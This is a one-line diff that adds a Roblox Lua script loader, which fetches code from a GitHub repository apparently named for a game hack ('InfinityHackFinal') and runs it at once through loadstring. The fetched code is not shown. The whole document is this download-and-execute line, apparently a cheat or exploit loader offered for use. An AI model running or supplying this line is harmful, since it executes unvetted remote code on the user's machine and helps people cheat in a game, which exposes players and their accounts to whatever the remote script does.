@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/InfinityHack69/InfinityHackFinal/main/final"))()
